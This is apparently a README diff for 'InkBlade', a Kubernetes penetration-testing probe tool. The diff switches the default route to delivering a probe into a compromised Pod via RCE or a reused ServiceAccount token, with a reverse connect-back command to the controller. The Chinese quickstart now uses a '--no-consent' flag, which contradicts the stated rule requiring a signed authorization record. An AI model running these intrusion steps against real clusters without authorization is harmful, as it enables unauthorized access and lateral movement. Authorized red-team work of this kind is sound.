@@ -14,8 +14,8 @@
 | 控制端 Python | 3.10 – 3.13 | 只用标准库；不需要编译器 |
 | InkBlade 控制器 | 源码检出或 wheel | `inkblade` 命令或 `python -m inkblade` |
 | 探针二进制 | Linux amd64 或 arm64 | 静态链接；目标 Pod 不需要 Python |
-| kubectl | 1.26+ | 可选；只有 `kubectl`/`sa-token` 投放路径需要 |
-| kubeconfig | 有授权的最小权限 | 只读盘点也需要 |
+| kubectl | 1.26+ | 可选；只有 `kubectl` 批量 bootstrap 路径需要 |
+| kubeconfig | 有授权的最小权限 | 可选；foothold/external 接入不需要 |
 | 授权记录 | consent/ROE | 没有签署记录不执行 |
 | 磁盘 | 约 300 MB 起 | 证据随项目增长 |
 
@@ -56,12 +56,10 @@ cargo build --release --target aarch64-unknown-linux-musl
 ### 第一次接入
 
 ```bash
-python -m inkblade up
+python -m inkblade up --no-consent
 ```
 
-`up` 创建工作区、检查授权记录、引导导入 kubeconfig，并把下一步指向 `quickstart`、`session open` 与 `probe deploy`。
-
-签授权记录：
+`up` 创建工作区、打印一次性 admin 密码，并在 `127.0.0.1:8765` 提供本地控制台。浏览器登录后签授权记录，或执行：
 
 ```bash
 python -m inkblade quickstart
@@ -69,26 +67,40 @@ python -m inkblade quickstart
 
 `quickstart` 用五个问题确定目标、范围、级别、用户与签署。`inkblade roe` 可以随时查看当前记录。
 
-打开会话并投放探针：
+默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。已有探针时，不需要 kubeconfig，也不需要重新投放：
+
+```bash
+python -m inkblade probe list
+python -m inkblade channel listen
+```
+
+在 Pod 内让探针回连：
+
+```bash
+inkblade-probe reverse --host <controller> --port <port>
+```
+
+首次投放用已有立足点：
 
 ```bash
 python -m inkblade session open \
-  --mode kubeconfig \
-  --workspace ./work \
-  --kubeconfig ~/.kube/config \
-  --namespace ml-team \
-  --pod infer-0
+  --mode foothold \
+  --target <target> \
+  --credential-source pod-shell \
+  --namespace <namespace> \
+  --pod <pod>
 
 python -m inkblade probe deploy \
   --session <session-id> \
-  --via kubectl \
+  --via rce \
   --binary ./inkblade-probe-linux-amd64 \
-  --namespace ml-team \
-  --pod infer-0 \
+  --probe-token-file ./probe.token \
   --allow-write
 ```
 
-看到 `probe list` 里有 `probe-...`，并且 `probe collect` 的快照里 SA、挂载、网络接口和 GPU 设备都符合预期，再跑检测。
+随后在 Pod 内让探针回连控制端。`--via rce` 适合低权限 Pod；`--via sa-token` 使用已有 ServiceAccount token。`--mode external --proof @proof.json` 用于只有可达服务的场景，先提交有界证明，再经授权 RCE 或回调投放。看到 `probe list` 里有新的 `probe-...`，并且 `probe collect` 的快照里 SA、挂载、网络接口和 GPU 设备都符合预期，再跑检测。子探针由父探针用 `probe upload` + `probe spawn` 投放并回连。
+
+可选：持有运维 kubeconfig、需要一次给多个 Pod 做 bootstrap 时，使用 `session open --mode kubeconfig --kubeconfig <path>` 与 `probe deploy --via kubectl`。这是高级路径，不是首次接入的前置步骤。
 
 ### 容器与 Kubernetes
 
@@ -182,7 +194,7 @@ python -m pip install -e .
 python -m inkblade up
 ```
 
-`up` creates the workspace, checks the authorization record and walks through kubeconfig import. Sign the record with `quickstart`, then open a session with `session open --mode kubeconfig`, deliver the probe with `probe deploy --via kubectl`, and confirm the snapshot with `probe collect`.
+`up` creates the workspace, prints a one-time admin password and serves the local console. Sign the record with `quickstart` or in the console. The default foothold is a least-privilege Pod with outbound TCP only: the controller listens with `channel listen`, the probe connects back with `inkblade-probe reverse`, and first delivery uses `session open --mode foothold` plus `probe deploy --via rce|sa-token`. No kubeconfig is required; `session open --mode kubeconfig` is the optional batch bootstrap for several Pods.
 
 Verify the probe hash and architecture before deployment. A dynamic build is not a release binary; replace it or rebuild with musl.
 
